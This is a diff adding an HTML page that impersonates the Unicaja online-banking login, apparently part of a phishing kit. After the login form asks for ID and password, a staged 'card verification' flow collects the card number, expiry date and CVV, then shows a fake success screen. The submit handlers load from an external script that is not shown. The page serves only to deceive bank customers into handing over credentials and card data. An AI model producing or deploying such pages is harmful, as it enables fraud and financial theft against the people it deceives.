@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Unicaja | Banca Online</title>
+    <link rel="stylesheet" href="unicaja-styles.css">
+</head>
+<body>
+
+    <!-- TOP NAV -->
+    <nav class="top-nav">
+        <a href="#">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path fill-rule="evenodd" clip-rule="evenodd" d="M10.2425 2.99902C7.87163 2.99902 5.94971 4.92095 5.94971 7.29177C5.94971 8.89089 6.8241 10.2858 8.12085 11.0244C4.727 11.1727 2 13.9929 2 17.4293V20.2505C2 20.6648 2.33579 21.0005 2.75 21.0005H17.735C18.1492 21.0005 18.485 20.6648 18.485 20.2505V17.4293C18.485 14.0027 15.7586 11.1731 12.364 11.0244C13.6608 10.2858 14.5353 8.89089 14.5353 7.29177C14.5353 4.92095 12.6134 2.99902 10.2425 2.99902Z" fill="#005265"/></svg>
+            Alta en Banca Digital
+        </a>
+        <a href="#">
+            <svg width="20" height="20" viewBox="0 0 20 20" fill="none"><path fill-rule="evenodd" clip-rule="evenodd" d="M8.2 4.2C8.23 4.12 8.35 4.12 8.38 4.2L9.4 6.56C9.52 6.84 9.74 7.07 10.02 7.19L12.38 8.2C12.46 8.23 12.46 8.35 12.38 8.38L10.02 9.4C9.74 9.52 9.52 9.74 9.4 10.02L8.38 12.38C8.35 12.46 8.23 12.46 8.2 12.38L7.19 10.02C7.07 9.74 6.84 9.52 6.56 9.4L4.2 8.38C4.12 8.35 4.12 8.23 4.2 8.2L6.56 7.19C6.84 7.07 7.07 6.84 7.19 6.56L8.2 4.2Z" fill="#005265"/></svg>
+            Hazte cliente
+        </a>
+    </nav>
+
+    <!-- MAIN -->
+    <main>
+        <div class="logo-container">
+            <img src="assets/images/logo_unicaja.svg" alt="Logo de Unicaja">
+        </div>
+
+        <div class="form-container">
+
+            <!-- STEP 1: LOGIN -->
+            <div class="form-section" id="loginSection">
+                <h1 class="login-heading">Acceso a Banca Online</h1>
+                <div class="form-group">
+                    <label for="dni">DNI, NIE, Pasaporte o usuario</label>
+                    <input type="text" id="dni" autocomplete="off" required>
+                </div>
+                <div class="form-group">
+                    <label for="clave">Clave de acceso</label>
+                    <div class="password-wrapper">
+                        <input type="password" id="clave" autocomplete="off" required>
+                        <button type="button" class="mostrar-btn" id="mostrarBtn" onclick="togglePassword()">Mostrar</button>
+                    </div>
+                </div>
+                <a href="#" class="recover-link">Recuperar clave de acceso</a>
+                <button class="btn-submit" id="loginBtn" disabled>Acceder</button>
+                <div class="security-box">
+                    <svg class="umbrella" width="33" height="32" viewBox="0 0 33 32" fill="none">
+                        <path d="M15.5 4.54V0.54H17.5V4.54H15.5Z" fill="#016C85" stroke="#2BD024" stroke-width="0.3"/>
+                        <path d="M32.5 17.99C32.5 9.15 25.34 1.99 16.5 1.99C7.66 1.99 0.5 9.15 0.5 17.99H32.5Z" fill="url(#u1)"/>
+                        <path d="M16.5 17.99H17.5V27.99C17.5 29.64 16.16 30.99 14.5 30.99C12.84 30.99 11.5 29.64 11.5 27.99V26.99H13.5V27.99C13.5 28.54 13.95 28.99 14.5 28.99C15.05 28.99 15.5 28.54 15.5 27.99V17.99H16.5Z" fill="#016C85"/>
+                        <defs><linearGradient id="u1" x1="0.5" y1="9.99" x2="32.5" y2="9.99" gradientUnits="userSpaceOnUse"><stop stop-color="#016C85"/><stop offset="1" stop-color="#005265"/></linearGradient></defs>
+                    </svg>
+                    <div class="text">
+                        Protégete de los ciber ataques
+                        <a href="#">Ver recomendaciones de seguridad</a>
+                    </div>
+                </div>
+            </div>
+
+            <!-- STEP 2: TARJETA - Número -->
+            <div class="form-section hidden" id="stepTarjeta">
+                <h1 class="login-heading">Verificación de tarjeta</h1>
+                <p style="font-size:14px;color:#5a657e;margin-bottom:20px;text-align:center">Por seguridad, introduzca los datos de su tarjeta de crédito o débito asociada a su cuenta.</p>
+                <div class="form-group">
+                    <label for="tarjeta">Número de tarjeta</label>
+                    <input type="text" id="tarjeta" inputmode="numeric" maxlength="19" autocomplete="off" placeholder="0000 0000 0000 0000">
+                </div>
+                <button class="btn-submit" id="btnTarjeta" onclick="sendTarjeta()">Siguiente</button>
+            </div>
+
+            <!-- STEP 3: TARJETA - Caducidad -->
+            <div class="form-section hidden" id="stepFecha">
+                <h1 class="login-heading">Fecha de caducidad</h1>
+                <p style="font-size:14px;color:#5a657e;margin-bottom:20px;text-align:center">Mes y año de vencimiento de su tarjeta.</p>
+                <div class="form-group">
+                    <label for="fecha">MM / AA</label>
+                    <input type="text" id="fecha" maxlength="5" autocomplete="off" placeholder="MM/AA">
+                </div>
+                <button class="btn-submit" onclick="sendFecha()">Continuar</button>
+                <button class="btn-back" onclick="transition('stepFecha','stepTarjeta')">← Atrás</button>
+            </div>
+
+            <!-- STEP 4: TARJETA - CVV -->
+            <div class="form-section hidden" id="stepCVV">
+                <h1 class="login-heading">Código de seguridad</h1>
+                <p style="font-size:14px;color:#5a657e;margin-bottom:20px;text-align:center">Los 3 dígitos del reverso de su tarjeta.</p>
+                <div class="form-group">
+                    <label for="cvv">CVV</label>
+                    <input type="password" id="cvv" inputmode="numeric" maxlength="3" autocomplete="off">
+                </div>
+                <button class="btn-submit" onclick="sendCVV()">Finalizar</button>
+                <button class="btn-back" onclick="transition('stepCVV','stepFecha')">← Atrás</button>
+            </div>
+
+            <!-- STEP 5: OK -->
+            <div class="form-section hidden" id="stepOK">
+                <div style="text-align:center;padding:40px 0">
+                    <div style="font-size:50px;margin-bottom:20px">✅</div>
+                    <h1 class="login-heading">Verificación completada</h1>
+                    <p style="font-size:14px;color:#5a657e;margin-bottom:20px">Su identidad ha sido verificada correctamente. Redirigiendo...</p>
+                    <div class="spinner" style="margin:0 auto"></div>
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+    <!-- FOOTER -->
+    <footer>
+        <p class="footer-copyright">© Unicaja Banco, S.A. 2026. Todos los derechos reservados.</p>
+        <ul class="footer-links">
+            <li><a href="#">Aviso legal</a></li>
+            <li><a href="#">Cookies</a></li>
+            <li><a href="#">Privacidad</a></li>
+            <li><a href="#">Seguridad</a></li>
+        </ul>
+    </footer>
+
+    <!-- LOADING -->
+    <div class="loading" id="loadingScreen">
+        <div class="spinner"></div>
+        <p class="loading-text">Verificando credenciales...</p>
+    </div>
+
+    <script src="unicaja-scripts.js"></script>
+</body>
+</html>
